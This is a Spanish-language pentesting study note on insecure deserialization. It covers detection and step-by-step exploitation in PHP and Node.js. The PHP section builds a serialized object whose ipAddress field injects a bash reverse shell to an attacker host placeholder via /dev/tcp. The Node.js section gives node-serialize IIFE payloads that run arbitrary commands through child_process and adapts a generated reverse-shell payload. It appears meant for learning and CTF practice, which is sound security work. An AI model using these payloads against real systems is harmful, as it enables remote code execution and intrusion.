---------
- Tags: #OWASP_TOP_10 #vulnerabilidad #hacking #Deserialization #exploiting 
--------------
# Definición

> Los **ataques de deserialización** son amenazas cibernéticas en las que los datos serializados, al ser manipulados, pueden permitir a los atacantes ejecutar código malicioso en una aplicación, revelar información sensible o causar daño al sistema.
> 
> La **serialización** de un objeto es el proceso de convertir un objeto o estructura de datos en una secuencia de **bytes** que puede ser almacenada, transmitida o restaurada en su forma original posteriormente. Esto permite que los objetos se guarden en archivos, se envíen a través de la red o se almacenen en bases de datos de manera eficiente. La serialización es comúnmente utilizada en programación para preservar el estado de objetos y compartir datos entre diferentes aplicaciones o sistemas.
> 
> Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

----------------
# Detección de vulnerabilidad

Para detectar si un servicio es vulnerable a un **ataque de deserialización** podemos probar lo siguiente:

- **Manipulación de datos**: Podemos buscar campos donde los usuarios puedan ingresar datos que podrían estar sujetos a procesos de deserialización, como formularios, campos de cookies o parámetros en **URLs**, para introducir datos modificados cargando archivos serializados maliciosos.

- **Examinación de datos enviados**: Podemos interceptar la petición con un proxy, de manera que si vemos los datos enviados serializados (0:4:"test" por ejemplo) puede ser que sea vulnerable.

- **Observación de respuestas y comportamiento**: Podemos buscar errores específicos relacionados con la deserialización, como **"ClassNotFoundException"** o **"InvalidClassException"**, pudiendo resultar en una posible vulnerabilidad.

---------------
# Explotación 

## PHP

Primeramente, debemos interceptar la petición con [[Burpsuite]], y podemos observar una petición, en la que se está enviando información como la siguiente:

```
obj=0:4:"Test":1:{s:9:"ipAddress";s:14:"192.168.111.45";}
```

Y vemos que es un objeto serializado, donde se indica que el objeto tiene 4 caracteres de longitud (Test), y el objeto tiene dos atributos, el primero un **s**tring de 9 caracteres (ipAddress) y el segundo otro **s**tring de 14 caracteres (192.168.111.45).

Para poder proceder con la explotación sería conveniente y casi necesario haber encontrado el código fuente que gestiona el comportamiento del objeto enviado. 

Suponiendo que cuando se esté tratando a nuestro objeto, se está ejecutando un comando por detrás, podríamos tratar de inyectar los comandos que nos plazca. Para ello, puede ser que exista en el código fuente algún tipo de variable que compruebe que si los datos introducidos son correctos, y si es así que se ejecute la acción correspondiente. Podríamos enfrentarnos a algo parecido a lo siguiente:

``` php
...
class pingTest{
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP)){
				$this->isValid = true;
			}
		}
	}

	public function ping(){
		if ($this->isValid){
			$this->output = shell_exec("ping -c 3 $this->ipAddress");
		}
	}
}
...
```

En este caso la variable mencionada anteriormente sería **isValid**, que comprueba si los datos están correctamente introducidos. Así que podríamos tratar de enviar un objeto serializado de la misma clase, sobrescribiendo la variable **isValid** a true, de manera que podríamos inyectar el comando que nos plazca. Para crear el objeto serializado podemos ejecutar el siguiente script en **php**, que nos devolverá el mismo:

```php
<?php

class pingTest{
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO_ATACANTE>'";
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new PingTest))
?>
```

De manera que si enviamos el objeto que nos devuelve el script a través de [[Burpsuite]], y nos ponemos en escucha, obtendremos una [[Reverse shell]].

## Nodejs

Una vez interceptada la petición, y encontrado el campo donde se está realizando la deserialización, podemos proceder con el ataque. Un objeto serializado en **Nodejs** podría ser el siguiente:

```
{"username":"user","country":"spain"}
```

Para serializar algo que le proporcionemos, podemos hacer uso del siguiente script en **nodejs** (node script.js para ejecutar)

```node
var y = {
	rce : function(){
	require('child_process').exec('<COMANDO A EJECUTAR>',function(error,stdout,stderr) { console.log(stdout)});
	},
}
var serialize = require('node-serialize');
console.log("Serialized: \n"+ serialize.serialize(y));
```

Pero esto no se va a ejecutar, nos va a serializar la instrucción.
Hay un concepto, llamado **IIFE** (Immediately Invoked Function Expression), que nos permite hacer la llamada a la instrucción inmediatamente. Para poder hacer uso del **IIFE**, tendremos que poner un () al final de la instrucción, por ejemplo, con el script anterior para que se ejecute el comando que le hayamos proporcionado, podemos modificar el script para que quede de la siguiente manera:

```node
var y = {
	rce : function(){
	require('child_process').exec('<COMANDO A EJECUTAR>',function(error,stdout,stderr) { console.log(stdout)});
	}(),  
}
var serialize = require('node-serialize');
console.log("Serialized: \n"+ serialize.serialize(y));
```

Pero, claro, el comando se va a ejecutar cuando se serialice la instrucción, y nosotros queremos que se ejecute la instrucción cuando se deserialice en el servidor. En el servidor se podría estar ejecutando un script como el siguiente para deserializar la instrucción como el que sigue:

```node
var serialize = require('node-serialize');
var payload = '<DATO_SERIALIZADO>';
serialize.unserialize(payload);
```

En la variable **payload** se recibe el dato que hemos serializado anteriormente (quitando saltos de línea y escapando las comillas), por ejemplo:

```
{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}"}
```

De manera que si queremos que se produzca el mencionado **IIFE**, podemos añadir un () justamente antes de las últimas dobles comillas, de forma que quedaría así: 

```
{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

Y si enviamos dicho objeto, se ejecutaría la instrucción que hemos introducido. 
Para tensar la cosa un poco más arrastrando este concepto, y conseguir una [[Reverse shell]], podemos hacer uso de [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py), que nos crea un [[Payload]] para dicho objetivo. El payload conseguido, habrá que adaptarlo un poco para que quede serializado, de manera que tendremos un dato serializado de la siguiente manera:

```
{"rce":"_$$ND_FUNC$$_function(){<PAYLOAD>}()"}
```

y si lo enviamos como corresponde, y estando en escucha, lo habremos conseguido.

---------------------
# Ejemplos prácticos

- [Máquina Cereal 1](https://www.vulnhub.com/entry/cereal-1,703/) (PHP Deserialization Attack)
- [Opsexc.com](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)(Nodejs Deserialization Attack)